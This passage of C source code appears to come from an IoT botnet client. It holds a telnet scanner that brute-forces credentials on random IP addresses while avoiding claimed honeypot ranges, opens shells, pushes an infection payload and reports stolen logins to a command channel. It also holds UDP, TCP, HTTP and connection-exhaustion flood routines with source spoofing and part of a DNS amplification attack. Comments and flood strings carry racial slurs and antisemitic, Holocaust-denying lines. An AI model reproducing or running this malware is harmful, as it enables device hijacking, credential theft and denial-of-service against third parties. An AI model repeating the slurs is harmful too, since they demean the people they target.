            got = recv(fd, initialRead + 1, 2, 0);
            if (got == -1 || got == 0) return 0;
            bufferUsed += got;
            if (!negotiate(fd, initialRead, 3)) return 0;
        } else {
            if (strstr(buffer, toFind) != NULL || (matchLePrompt && matchPrompt(buffer))) {
                found = 1;
                break;
            }
        }
    }

    if (found) return 1;
    return 0;
}

in_addr_t getDatIP() {
    uint8_t ipState[4] = {
        0
    };
    ipState[0] = rand() % 255;
    ipState[1] = rand() % 255;
    ipState[2] = rand() % 255;
    ipState[3] = rand() % 255;

    while (
        (ipState[0] == 0) ||
        (ipState[0] == 10) ||
        (ipState[0] == 100 && (ipState[1] >= 64 && ipState[1] <= 127)) ||
        (ipState[0] == 127) ||
        (ipState[0] == 169 && ipState[1] == 254) ||
        (ipState[0] == 172 && (ipState[1] <= 16 && ipState[1] <= 31)) ||
        (ipState[0] == 192 && ipState[1] == 0 && ipState[2] == 2) ||
        (ipState[0] == 192 && ipState[1] == 88 && ipState[2] == 99) ||
        (ipState[0] == 192 && ipState[1] == 168) ||
        (ipState[0] == 198 && (ipState[1] == 18 || ipState[1] == 19)) ||
        (ipState[0] == 198 && ipState[1] == 51 && ipState[2] == 100) ||
        (ipState[0] == 203 && ipState[1] == 0 && ipState[2] == 113) ||
        (ipState[0] == 62 && ipState[1] <= 30) || //Honeypot
        (ipState[0] == 207 && ipState[1] >= 31 && ipState[2] <= 120) || //FBI Honeypots (207.31.0.0 - 207.120.255.255) 
        (ipState[0] == 65) && (ipState[1] >= 224) && (ipState[2] <= 226) || // More FBI Honeypots (64.224.0.0 - 64.226.255.255)
        (ipState[0] == 195) && (ipState[1] == 10) || //Yet another FBI Honeypot. 
        (ipState[0] == 216) && (ipState[1] == 25 || ipState[1] == 94) || //Fucking nigger LOL (FBI Honeypots)
        (ipState[0] == 212) && (ipState[1] == 56) || //The fuck?! 212.56.107.22 - uhhhhm. FBI Honeypot. 
        (ipState[0] >= 224) && (ipState[0] <= 239) //Multicast ip ranges
    ) {
        ipState[0] = rand() % 255;
        ipState[1] = rand() % 255;
        ipState[2] = rand() % 255;
        ipState[3] = rand() % 255;
    }

    char ip[16] = {
        0
    };
    sprintf(ip, "%d.%d.%d.%d", ipState[0], ipState[1], ipState[2], ipState[3]);
    return inet_addr(ip);
}

unsigned short csum(unsigned short * buf, int count) {
    register int sum = 0;
    while (count > 1) {
        sum += * buf++;
        count -= 2;
    }
    if (count > 0) {
        sum += * (unsigned char * ) buf;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

unsigned short tcpcsum(struct iphdr * iph, struct tcphdr * tcph) {

    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    }
    pseudohead;
    unsigned short total_len = iph -> tot_len;
    pseudohead.src_addr = iph -> saddr;
    pseudohead.dst_addr = iph -> daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short * tcp = malloc(totaltcp_len);
    memcpy((unsigned char * ) tcp, & pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char * ) tcp + sizeof(struct tcp_pseudo), (unsigned char * ) tcph, sizeof(struct tcphdr));
    unsigned short output = csum(tcp, totaltcp_len);
    free(tcp);
    return output;
}

void makeIPPacket(struct iphdr * iph, int dest, int source, uint8_t protocol, int packetSize) {
    iph -> ihl = 5;
    iph -> version = 4;
    iph -> tos = 0;
    iph -> tot_len = sizeof(struct iphdr) + packetSize;
    iph -> id = rand_cmwc();
    iph -> frag_off = 0;
    iph -> ttl = MAXTTL;
    iph -> protocol = protocol;
    iph -> check = 0;
    iph -> saddr = source;
    iph -> daddr = dest;
}

int sclose(int fd) {
    if (3 > fd) return 1;
    close(fd);
    return 0;
}

char *mygethostbyname(char *hostname) {
    int sockfd;
    struct addrinfo hints, * servinfo, * p;
    struct sockaddr_in * h;
    int rv;
    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    if ((rv = getaddrinfo(hostname, "80",&hints,&servinfo)) != 0) {
        return "";
    }
    // loop through all the results and connect to the first we can
    for (p = servinfo; p != NULL; p = p->ai_next) {
        h = (struct sockaddr_in * ) p->ai_addr;
        return inet_ntoa(h->sin_addr);
    }
    freeaddrinfo(servinfo); // all done with this structure
    return "";
}

int socket_connect(char * host, in_port_t port) {
    struct hostent * hp;
    struct sockaddr_in addr;
    int on = 1, sock;
    if ((hp = mygethostbyname(host)) == NULL) return 0;
    bcopy(hp -> h_addr, & addr.sin_addr, hp -> h_length);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;
    sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char * ) & on, sizeof(int));
    if (sock == -1) return 0;
    if (connect(sock, (struct sockaddr * ) & addr, sizeof(struct sockaddr_in)) == -1)
        return 0;
    return sock;
}

void StartTheLelz(int wait_usec, int maxfds) {
    if(fork() < 0) return;
    int i, res, num_tmps, j;
    char buf[128], cur_dir;

    int max = maxfds;
    fd_set fdset;
    struct timeval tv;
    socklen_t lon;
    int valopt;

    srand(time(NULL) ^ rand_cmwc());

    char line[256];
    char * buffer;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(23);
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    buffer = malloc(SOCKBUF_SIZE + 1);
    memset(buffer, 0, SOCKBUF_SIZE + 1);

    struct telstate_t fds[max];

    memset(fds, 0, max * (sizeof(int) + 1));
    for (i = 0; i < max; i++) {
        memset( & (fds[i]), 0, sizeof(struct telstate_t));
        fds[i].complete = 1;
        fds[i].sockbuf = buffer;
    }

    while (1) {
        for (i = 0; i < max; i++) {
            if (fds[i].totalTimeout == 0) {
                fds[i].totalTimeout = time(NULL);
            }

            switch (fds[i].state) {
            case 0:
                {
                    if (fds[i].complete == 1) {
                        // clear the current fd
                        char * tmp = fds[i].sockbuf;
                        memset( & (fds[i]), 0, sizeof(struct telstate_t));
                        fds[i].sockbuf = tmp;
                        // get a new random ip
                        fds[i].ip = getDatIP();
                    } else if (fds[i].complete == 0) {
                        fds[i].passwordInd++;
                        fds[i].usernameInd++;

                        if (fds[i].passwordInd == sizeof(passwords) / sizeof(char * )) {
                            fds[i].complete = 1;
                            continue;
                        }
                        if (fds[i].usernameInd == sizeof(usernames) / sizeof(char * )) {
                            fds[i].complete = 1;
                            continue;
                        }
                    }

                    dest_addr.sin_family = AF_INET;
                    dest_addr.sin_port = htons(23);
                    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);
                    dest_addr.sin_addr.s_addr = fds[i].ip;

                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);

                    if (fds[i].fd == -1) continue;

                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);

                    if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) == -1 && errno != EINPROGRESS) {
                        reset_telstate(&fds[i]);
                    } else {
                        advance_telstate(&fds[i], 1);
                    }
                }
                break;
            case 1:
                {
                    FD_ZERO( & fdset);
                    FD_SET(fds[i].fd, & fdset);
                    tv.tv_sec = 0;
                    tv.tv_usec = wait_usec;
                    res = select(fds[i].fd + 1, NULL, & fdset, NULL, & tv);

                    if (res == 1) {
                        lon = sizeof(int);
                        valopt = 0;
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
                        //printf("%d\n",valopt);
                        if (valopt) {
                            reset_telstate(&fds[i]);
                        } else {
                            fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) & (~O_NONBLOCK));
                            advance_telstate(&fds[i], 2);
                        }
                        continue;
                    } else if (res == -1) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (fds[i].totalTimeout + 5 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 2:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances)) {
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else {
                            advance_telstate(&fds[i], 3);
                        }

                        continue;
                    }

                    if (fds[i].totalTimeout + 7 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 3:
                {
                    if (send(fds[i].fd, usernames[fds[i].usernameInd], strlen(usernames[fds[i].usernameInd]), MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    advance_telstate(&fds[i], 4);
                }
                break;

            case 4:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances)) {
                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else {
                            advance_telstate(&fds[i], 5);
                        }
                        continue;
                    }

                    if (fds[i].totalTimeout + 3 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;

            case 5:
                {
                    if (send(fds[i].fd, passwords[fds[i].passwordInd], strlen(passwords[fds[i].passwordInd]), MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }

                    if (send(fds[i].fd, "\r\n", 2, MSG_NOSIGNAL) < 0) {
                        reset_telstate(&fds[i]);
                        continue;
                    }
                    advance_telstate(&fds[i], 6);
                }
                break;

            case 6:
                {
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, advances2)) {
                        fds[i].totalTimeout = time(NULL);

                        if (contains_fail(fds[i].sockbuf)) {
                            advance_telstate(&fds[i], 0);
                        } else if (contains_success(fds[i].sockbuf)) {
                            if (fds[i].complete == 2) {
                                advance_telstate(&fds[i], 7);
                            } else {
                                sockprintf(mainCommSock, "REPORT %s:23 %s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                                advance_telstate(&fds[i], 7);
                            }
                        } else {
                            reset_telstate(&fds[i]);
                        }
                        continue;
                    }

                    if (fds[i].totalTimeout + 7 < time(NULL)) {
                        reset_telstate(&fds[i]);
                    }
                }
                break;
            case 7:
                {
                    fds[i].totalTimeout = time(NULL);
                    if (send(fds[i].fd, "enable\r\n", 8, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (send(fds[i].fd, "system\r\n", 8, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (send(fds[i].fd, "shell\r\n", 7, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (send(fds[i].fd, "sh\r\n", 4, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (send(fds[i].fd, "echo -e '\\x41\\x4b\\x34\\x37'", 26, MSG_NOSIGNAL) < 0) {
                        sclose(fds[i].fd);
                        fds[i].state = 0;
                        fds[i].complete = 1;
                        continue;
                    }
                    if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, legit)) {
                        if (send(fds[i].fd, rekdevice, strlen(rekdevice), MSG_NOSIGNAL) > 0) {
                            reset_telstate(&fds[i]);
                        }
                        sleep(20);
                        if (read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, SOCKBUF_SIZE, infected)) {
                            sockprintf(mainCommSock, "SUCCESSFUL INFECTION ---> %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                            reset_telstate(&fds[i]);
                            continue;
                        }
                        if (fds[i].totalTimeout + 60 < time(NULL)) {
                            if (fds[i].complete != 3) {
                                sockprintf(mainCommSock, "FAILED TO INFECT ---> %s:%s:%s", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
                            }
                            reset_telstate(&fds[i]);
                        }
                    }
                    break;
                }
            }
        }
    }
}

void sendSTD(unsigned char * ip, int port, int secs) {

    int fd, i, packetsize, index;
    //    int flag = 1;
    int randport = 0;
    struct hostent * hp;
    struct sockaddr_in in ;
    time_t start = time(NULL);
    char * strport;
    unsigned char * packet = malloc(1024);
    memset(packet, 0, 1024);
    char str[12];
    sprintf(str, "%d", port);
    if (!strcmp(str, "0")) {
        randport = 1;
    }
    char * randstrings[] = {
        "std",
        "dts",
        "lsk",
        "kek",
        "smack",
        "ily",
        "tfw no gf",
        "frienzoned",
        "tyf",
        "pos",
        "cunts",
        "keksec",
        "keksec rox",
        "keksec ROX",
        "get raped",
        "not a ddos packet",
        "also not a ddos packet",
        "seriously not a ddos packet",
        "GET / HTTP/1.1\r\nHost: goatse.info\r\n\r\n",
        "GET / HTTP/1.1\r\nHost: tubgirl.ca\r\n\r\n",
        "GET / HTTP/1.0\r\nHost: goatse.info\r\n\r\n",
        "GET / HTTP/1.0\r\nHost: tubgirl.ca\r\n\r\n",
        "8======D~~~~~~~",
        "suck it",
        "give succ",
        "big nigger dick 8============================D",
        "( . Y . ) tiddies",
        "bigkek",
        "eye pee rape",
        "eye pee address rape",
        "IP rape",
        "eye pee address rape",
        "This is LOIC",
        "LOIC",
        "HOIC",
        "XOIC",
        "LHXOIC",
        "A cat is fine too. Desudesudesu~", // LOIC packets. KEKEK
        "the biiiiig pussy",
        "benis",
        "penis",
        "dick",
        "vagina",
        "clitoris",
        "pussy",
        "tfw",
        ":^}",
        "dic pic?",
        "send nudes",
        "https://youtu.be/dQw4w9WgXcQ",
        "Never gonna give you up",
        "Never gonna make you cry",
        "Never gonna let you die",
        "Never gonna hurt you",
        "bush did 9/11",
        "jet fuel can't melt steel beams",
        "9/11 was an inside job",
        "the illuminati is real",
        "wake up sheep",
        "i flex like david ike",
        "6 million jews? show me the proof!",
        "T R I G G E R E D",
        "free masons suck cock",
        "ihatejews",
        "urgay",
        "tfw u like dick",
        "dickbutt",
        "The elusive dickbut",
        "Heyyy that's pretty gooood",
        "NSA sucks cock",
        "FBI sucks cock",
        "You name it they suck cock"
        "What am I doing with my life",
        "Oh yeah I like nulling shit",
        "HIIYYOOOOOOO (Customgrow420)",
        "Keemstar is a fucking knome",
        "Leafy is gawd <3",
        "Ourmine is full of skids",
        "STC is the greatest"
    }; 
    in.sin_family = AF_INET;
    sockprintf(mainCommSock, "STD attacking %s:%s", ip, str);
    while (1) {
        if (randport == 1) { in.sin_port = htons((rand() % 65535) + 1026);
        } else { in.sin_port = htons(port);
        }
        if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0);
        else {
            packet = randstrings[rand() % (sizeof(randstrings) / sizeof(char * ))];
            sendto(fd, packet, strlen(packet), 0, (struct sockaddr * ) & in , sizeof( in ));
            close(fd);
        }
        if (i >= 100) {
            if (time(NULL) >= start + secs) {
                break;
            } else {
                i = 0;
            }
        }
        i++;
    }
    close(fd);
    exit(0);
}

void sendUDP(unsigned char * target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if (port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if (getHost(target, & dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    register unsigned int pollRegister;
    pollRegister = pollinterval;

    if (spoofit == 32) {
        int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (!sockfd) {
            sockprintf(mainCommSock, "Failed opening raw socket.");
            return;
        }

        unsigned char * buf = (unsigned char * ) malloc(packetsize + 1);
        if (buf == NULL) return;
        memset(buf, 0, packetsize + 1);
        makeRandomStr(buf, packetsize);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while (1) {
            sendto(sockfd, buf, packetsize, 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

            if (i == pollRegister) {
                if (port == 0) dest_addr.sin_port = rand_cmwc();
                if (time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;
            if (ii == sleepcheck) {
                usleep(sleeptime * 1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    } else {
        int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
        if (!sockfd) {
            sockprintf(mainCommSock, "Failed opening raw socket.");
            return;
        }

        int tmp = 1;
        if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, & tmp, sizeof(tmp)) < 0) {
            sockprintf(mainCommSock, "Failed setting raw headers mode.");
            return;
        }

        int counter = 50;
        while (counter--) {
            srand(time(NULL) ^ rand_cmwc());
            init_rand(rand());
        }

        in_addr_t netmask;

        if (spoofit == 0) netmask = (~((in_addr_t) - 1));
        else netmask = (~((1 << (32 - spoofit)) - 1));

        unsigned char packet[sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
        struct iphdr * iph = (struct iphdr * ) packet;
        struct udphdr * udph = (void * ) iph + sizeof(struct iphdr);

        makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getDatIP(netmask)), IPPROTO_UDP, sizeof(struct udphdr) + packetsize);

        udph -> len = htons(sizeof(struct udphdr) + packetsize);
        udph -> source = rand_cmwc();
        udph -> dest = (port == 0 ? rand_cmwc() : htons(port));
        udph -> check = 0;

        makeRandomStr((unsigned char * )(((unsigned char * ) udph) + sizeof(struct udphdr)), packetsize);

        iph -> check = csum((unsigned short * ) packet, iph -> tot_len);

        int end = time(NULL) + timeEnd;
        register unsigned int i = 0;
        register unsigned int ii = 0;
        while (1) {
            sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

            udph -> source = rand_cmwc();
            udph -> dest = (port == 0 ? rand_cmwc() : htons(port));
            iph -> id = rand_cmwc();
            iph -> saddr = htonl(getDatIP(netmask));
            iph -> check = csum((unsigned short * ) packet, iph -> tot_len);

            if (i == pollRegister) {
                if (time(NULL) > end) break;
                i = 0;
                continue;
            }
            i++;

            if (ii == sleepcheck) {
                usleep(sleeptime * 1000);
                ii = 0;
                continue;
            }
            ii++;
        }
    }
}

void sendTCP(unsigned char * target, int port, int timeEnd, int spoofit, unsigned char * flags, int packetsize, int pollinterval) {
    register unsigned int pollRegister;
    pollRegister = pollinterval;

    struct sockaddr_in dest_addr;

    dest_addr.sin_family = AF_INET;
    if (port == 0) dest_addr.sin_port = rand_cmwc();
    else dest_addr.sin_port = htons(port);
    if (getHost(target, & dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (!sockfd) {
        sockprintf(mainCommSock, "Failed opening raw socket.");
        return;
    }

    int tmp = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, & tmp, sizeof(tmp)) < 0) {
        sockprintf(mainCommSock, "Failed setting raw headers mode.");
        return;
    }

    in_addr_t netmask;

    if (spoofit == 0) netmask = (~((in_addr_t) - 1));
    else netmask = (~((1 << (32 - spoofit)) - 1));

    unsigned char packet[sizeof(struct iphdr) + sizeof(struct tcphdr) + packetsize];
    struct iphdr * iph = (struct iphdr * ) packet;
    struct tcphdr * tcph = (void * ) iph + sizeof(struct iphdr);

    makeIPPacket(iph, dest_addr.sin_addr.s_addr, htonl(getDatIP(netmask)), IPPROTO_TCP, sizeof(struct tcphdr) + packetsize);

    tcph -> source = rand_cmwc();
    tcph -> seq = rand_cmwc();
    tcph -> ack_seq = 0;
    tcph -> doff = 5;

    if (!strcmp(flags, "all")) {
        tcph -> syn = 1;
        tcph -> rst = 1;
        tcph -> fin = 1;
        tcph -> ack = 1;
        tcph -> psh = 1;
    } else {
        unsigned char * pch = strtok(flags, ",");
        while (pch) {
            if (!strcmp(pch, "syn")) {
                tcph -> syn = 1;
            } else if (!strcmp(pch, "rst")) {
                tcph -> rst = 1;
            } else if (!strcmp(pch, "fin")) {
                tcph -> fin = 1;
            } else if (!strcmp(pch, "ack")) {
                tcph -> ack = 1;
            } else if (!strcmp(pch, "psh")) {
                tcph -> psh = 1;
            } else {
                sockprintf(mainCommSock, "Invalid flag \"%s\"", pch);
            }
            pch = strtok(NULL, ",");
        }
    }

    tcph -> window = rand_cmwc();
    tcph -> check = 0;
    tcph -> urg_ptr = 0;
    tcph -> dest = (port == 0 ? rand_cmwc() : htons(port));
    tcph -> check = tcpcsum(iph, tcph);

    iph -> check = csum((unsigned short * ) packet, iph -> tot_len);

    int end = time(NULL) + timeEnd;
    register unsigned int i = 0;
    while (1) {
        sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr * ) & dest_addr, sizeof(dest_addr));

        iph -> saddr = htonl(getDatIP(netmask));
        iph -> id = rand_cmwc();
        tcph -> seq = rand_cmwc();
        tcph -> source = rand_cmwc();
        tcph -> check = 0;
        tcph -> check = tcpcsum(iph, tcph);
        iph -> check = csum((unsigned short * ) packet, iph -> tot_len);

        if (i == pollRegister) {
            if (time(NULL) > end) break;
            i = 0;
            continue;
        }
        i++;
    }
}

// HTTP Flood
void sendHTTP(char * method, char * host, in_port_t port, char * path, int timeFoo, int power) {
    const char * connections[] = {
        "close",
        "keep-alive",
        "accept"
    };
    int i, timeEnd = time(NULL) + timeFoo;
    char request[512];
    sprintf(request, "%s %s HTTP/1.1\r\nConnection: %s\r\nAccept: */*\r\nUser-Agent: %s\r\n\r\n", method, path, connections[(rand() % 3)], UserAgents[rand() % NUMITEMS(UserAgents)]);
    for (i = 0; i < power; i++) {
        if (fork()) {
            while (timeEnd > time(NULL)) {
                int sock = socket_connect((char * ) host, port);
                if (sock != 0) {
                    write(sock, request, strlen(request));
                    close(sock);
                }
            }
            exit(1);
        }
    }
}

//              _     _     ___ _                 _
//   /\  /\___ | | __| |   / __\ | ___   ___   __| |
//  / /_/ / _ \| |/ _` |  / _\ | |/ _ \ / _ \ / _` |
// / __  / (_) | | (_| | / /   | | (_) | (_) | (_| |
// \/ /_/ \___/|_|\__,_| \/    |_|\___/ \___/ \__,_|

void sendHOLD(unsigned char *ip, int port, int end_time) {

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost(ip,&dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * )&dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL,&myset, NULL,&tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )(&valopt),&lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    FD_ZERO(&myset);
                    FD_SET(fds[i].fd,&myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL, NULL,&myset,&tv);
                    if (res != 0) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}


int realrand(int low, int high) {
    srand(time(NULL) + getpid());
    return (rand() % (high + 1 - low) + low);
}

void makeRandomShit(unsigned char *buf, int length) {
    srand(time(NULL));
    int i = 0;
    for (i = 0; i < length; i++) buf[i] = (rand() % 255) + 1;
}


void sendJUNK(unsigned char * ip, int port, int end_time) {

    int max = getdtablesize() / 2, i;

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(port);
    if (getHost(ip, & dest_addr.sin_addr)) return;
    memset(dest_addr.sin_zero, '\0', sizeof dest_addr.sin_zero);

    struct state_t {
        int fd;
        uint8_t state;
    }
    fds[max];
    memset(fds, 0, max * (sizeof(int) + 1));

    fd_set myset;
    struct timeval tv;
    socklen_t lon;
    int valopt, res;

    unsigned char * watwat = malloc(1024);
    memset(watwat, 0, 1024);
    int packetLen = 1024;

    int end = time(NULL) + end_time;
    while (end > time(NULL)) {
        for (i = 0; i < max; i++) {
            switch (fds[i].state) {
            case 0:
                {
                    fds[i].fd = socket(AF_INET, SOCK_STREAM, 0);
                    fcntl(fds[i].fd, F_SETFL, fcntl(fds[i].fd, F_GETFL, NULL) | O_NONBLOCK);
                    if (connect(fds[i].fd, (struct sockaddr * ) & dest_addr, sizeof(dest_addr)) != -1 || errno != EINPROGRESS) close(fds[i].fd);
                    else fds[i].state = 1;
                }
                break;

            case 1:
                {
                    FD_ZERO( & myset);
                    FD_SET(fds[i].fd, & myset);
                    tv.tv_sec = 0;
                    tv.tv_usec = 10000;
                    res = select(fds[i].fd + 1, NULL, & myset, NULL, & tv);
                    if (res == 1) {
                        lon = sizeof(int);
                        getsockopt(fds[i].fd, SOL_SOCKET, SO_ERROR, (void * )( & valopt), & lon);
                        if (valopt) {
                            close(fds[i].fd);
                            fds[i].state = 0;
                        } else {
                            fds[i].state = 2;
                        }
                    } else if (res == -1) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;

            case 2:
                {
                    //nonblocking sweg
                    packetLen = realrand(32, 1024);
                    makeRandomShit(watwat, packetLen);
                    if (send(fds[i].fd, watwat, packetLen, MSG_NOSIGNAL) == -1 && errno != EAGAIN) {
                        close(fds[i].fd);
                        fds[i].state = 0;
                    }
                }
                break;
            }
        }
    }
}

struct list {
    char * resolver;
    struct list * next;
    struct list * prev;
};
struct list * head;
volatile int tehport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
struct thread_data {
    int thread_id;
    char * target;
    int dport;
    int limiter;
    int time;
};

typedef struct iphdr iph;
typedef struct udphdr udph;

// Pseudoheader struct
typedef struct {
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t filler;
    u_int8_t protocol;
    u_int16_t len;
}
ps_hdr;

// DNS header struct
typedef struct {
    unsigned short id; // ID
    unsigned short flags; // DNS Flags
    unsigned short qcount; // Question Count
    unsigned short ans; // Answer Count
    unsigned short auth; // Authority RR
    unsigned short add; // Additional RR
}
dns_hdr;

// Question types
typedef struct {
    unsigned short qtype;
    unsigned short qclass;
}
query;

// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
void dns_format(unsigned char * dns, unsigned char * host) {
    int lock = 0, i;
    strcat((char * ) host, ".");
    for (i = 0; i < strlen((char * ) host); i++) {
        if (host[i] == '.') {
            * dns++ = i - lock;
            for (; lock < i; lock++) {
                * dns++ = host[lock];
            }
            lock++;
        }
    }
    * dns++ = 0x00;
}

// Creates the dns header and packet
void dns_hdr_create(dns_hdr * dns) {
    dns -> id = (unsigned short) htons(getpid());
    dns -> flags = htons(0x0100);
    dns -> qcount = htons(1);
    dns -> ans = 0;
    dns -> auth = 0;
    dns -> add = 0;
}

void dns_send(char * trgt_ip, int trgt_p, char * dns_srv, unsigned char * dns_record) {
    // Building the DNS request data packet

    unsigned char dns_data[128];

    dns_hdr * dns = (dns_hdr * ) & dns_data;
    dns_hdr_create(dns);

    unsigned char * dns_name, dns_rcrd[32];
    dns_name = (unsigned char * ) & dns_data[sizeof(dns_hdr)];
    strcpy(dns_rcrd, dns_record);
    dns_format(dns_name, dns_rcrd);

    query * q;
    q = (query * ) & dns_data[sizeof(dns_hdr) + (strlen(dns_name) + 1)];
    q -> qtype = htons(0x00ff);
    q -> qclass = htons(0x1);

    // Building the IP and UDP headers
    char datagram[4096], * data, * psgram;
    memset(datagram, 0, 4096);

    data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data, & dns_data, sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query) + 1);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(dns_srv);

    iph * ip = (iph * ) datagram;
    ip -> version = 4;
    ip -> ihl = 5;
    ip -> tos = 0;
    ip -> tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    ip -> id = htonl(rand_cmwc() & 0xFFFFFFFF);
    ip -> frag_off = 0;
    ip -> ttl = 64;
    ip -> protocol = IPPROTO_UDP;
    ip -> check = 0;
